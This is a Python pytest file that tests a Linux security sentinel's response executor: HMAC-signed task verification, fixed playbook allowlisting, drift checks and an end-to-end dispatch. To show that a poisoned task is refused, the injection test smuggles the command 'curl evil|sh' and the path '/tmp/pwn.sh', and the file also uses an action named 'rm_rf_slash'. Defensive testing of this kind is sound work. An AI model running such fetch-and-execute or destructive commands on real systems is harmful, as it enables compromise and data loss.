"""
tier0: prove linux-sentinel's SOAR RESPONSE logic (DC-N11, Phase B).

No Rust runtime here -- sentinel_response_mirror.py re-derives the wire/exec
contract the Rust module will implement, and these tests pin it against the two
sources of truth that already exist: the canonical
project_empros/operations/agent/response_executor.py and the actual bundled
project_empros/operations/playbooks/linux/0X_*.sh scripts. Drift in either fails.

The security property under test: a sentinel host runs ONLY a signed Nexus task,
and ONLY a fixed bundled playbook chosen by action_type -- a tampered or
path-injecting task is refused.
"""

import os
import sys
from pathlib import Path

import pytest

import sentinel_response_mirror as srm   # tier0 on sys.path via conftest

# linux-sentinel and project_empros are siblings under the git root.
GIT_ROOT = Path(__file__).resolve().parents[4]
PB_DIR = GIT_ROOT / "project_empros" / "operations" / "playbooks" / "linux"
CANON_DIR = GIT_ROOT / "project_empros" / "operations" / "agent"
SECRET = b"nexus-task-dispatch-secret"


def _signed(action="isolate_host", **extra):
    task = {"kind": "response", "incident_id": "INC-B", "host": "sentinel-ep-1",
            "os_family": "linux", "action_type": action, "targets": extra.pop("targets", [])}
    task.update(extra)
    task["signature"] = srm.hmac.new(SECRET, srm._canonical(task), srm.hashlib.sha256).hexdigest()
    return task


# -- signature verification ---------------------------------------------------
def test_signed_task_verifies():
    srm.verify_task(_signed(), SECRET)            # no raise


def test_unsigned_task_refused():
    t = _signed()
    del t["signature"]
    with pytest.raises(srm.ResponseError):
        srm.verify_task(t, SECRET)


def test_tampered_task_refused():
    t = _signed()
    t["targets"] = ["attacker-added"]             # MITM on the outbound poll
    with pytest.raises(srm.ResponseError):
        srm.verify_task(t, SECRET)


# -- playbook selection is a fixed allowlist mapped to REAL bundled scripts ----
@pytest.mark.parametrize("action,script", list(srm.LINUX_PLAYBOOK.items()))
def test_every_action_maps_to_a_bundled_playbook(action, script):
    assert srm.select_playbook(action) == script
    assert (PB_DIR / script).exists(), f"sentinel must bundle {script}"


def test_unknown_action_has_no_playbook():
    with pytest.raises(srm.ResponseError):
        srm.select_playbook("rm_rf_slash")


# -- parity with the canonical Nexus-side contract (anti-drift) ---------------
def test_mirror_agrees_with_canonical_executor():
    sys.path.insert(0, str(CANON_DIR))
    import response_executor as rx
    for action in srm.LINUX_PLAYBOOK:
        assert srm.select_playbook(action) == rx.select_playbook(action, "linux"), \
            f"linux playbook for {action} drifted from response_executor"
    # build_env must produce the same NEXUS_* the playbooks read
    for task in (_signed("isolate_host", mgmt_ips=["10.0.0.0/24"]),
                 _signed("block_ip", targets=["8.8.8.8"], c2_domains=["evil.test"]),
                 _signed("eradicate_process", pids=[1234], processes=["evil"], hashes=["ab"]),
                 _signed("acquire_artifact", file_path="/tmp/evil")):
        assert srm.build_env(task) == rx.build_env(task)


# -- execution: fixed playbook + NEXUS_* env, never a task-supplied path -------
def test_execute_runs_fixed_playbook_with_env():
    calls = {}

    def fake_runner(cmd, env=None, capture_output=False):
        calls["cmd"], calls["env"] = cmd, env
        return type("R", (), {"returncode": 0})()

    task = _signed("block_ip", targets=["8.8.8.8"])
    out = srm.execute_task(task, secret=SECRET, playbooks_dir=PB_DIR, runner=fake_runner)
    assert out["status"] == "completed" and out["playbook"] == "04_block_c2.sh"
    assert calls["cmd"] == ["bash", str(PB_DIR / "04_block_c2.sh")]
    assert calls["env"]["NEXUS_C2_IPS"] == "8.8.8.8"
    assert calls["env"]["NEXUS_INCIDENT_ID"] == "INC-B"


def test_execute_ignores_task_supplied_command():
    """A poisoned task that smuggles its own 'playbook'/'command' still runs only
    the fixed script for its action_type."""
    def fake_runner(cmd, env=None, capture_output=False):
        fake_runner.cmd = cmd
        return type("R", (), {"returncode": 0})()

    task = _signed("isolate_host", mgmt_ips=["10.0.0.0/24"],
                   playbook="/tmp/pwn.sh", command="curl evil|sh")
    # re-sign so it verifies WITH the injected fields present
    task["signature"] = srm.hmac.new(SECRET, srm._canonical(task), srm.hashlib.sha256).hexdigest()
    out = srm.execute_task(task, secret=SECRET, playbooks_dir=PB_DIR, runner=fake_runner)
    assert fake_runner.cmd == ["bash", str(PB_DIR / "01_contain_host.sh")]
    assert out["playbook"] == "01_contain_host.sh"


def test_execute_refuses_forged_task():
    task = _signed("isolate_host")
    task["targets"] = ["attacker"]                # tamper after signing
    with pytest.raises(srm.ResponseError):
        srm.execute_task(task, secret=SECRET, playbooks_dir=PB_DIR,
                         runner=lambda *a, **k: None)


# -- E2E: Nexus signs a task → sentinel polls, verifies, executes, reports -----
def test_e2e_nexus_task_to_sentinel_outcome():
    sys.path.insert(0, str(CANON_DIR))
    import task_dispatch as td             # the real Nexus-side builder + store

    store = td.TaskStore()
    host = "sentinel-ep-1"
    task = td.build_response_task(incident_id="INC-E2E", host=host, os_family="linux",
                                  action_type="isolate_host", mgmt_ips=["10.0.0.0/24"],
                                  secret=SECRET)
    store.enqueue(host, task)                # worker_soar enqueues
    polled = store.poll(host)               # sentinel GET /api/v1/tasks (outbound)
    assert len(polled) == 1

    ran = {}

    def fake_runner(cmd, env=None, capture_output=False):
        ran["cmd"], ran["incident"] = cmd, env["NEXUS_INCIDENT_ID"]
        return type("R", (), {"returncode": 0})()

    outcome = srm.execute_task(polled[0], secret=SECRET, playbooks_dir=PB_DIR, runner=fake_runner)
    assert outcome["status"] == "completed"
    assert outcome["incident_id"] == "INC-E2E" and outcome["host"] == host
    assert ran["cmd"] == ["bash", str(PB_DIR / "01_contain_host.sh")]
    assert ran["incident"] == "INC-E2E"      # the Nexus task drove the local run
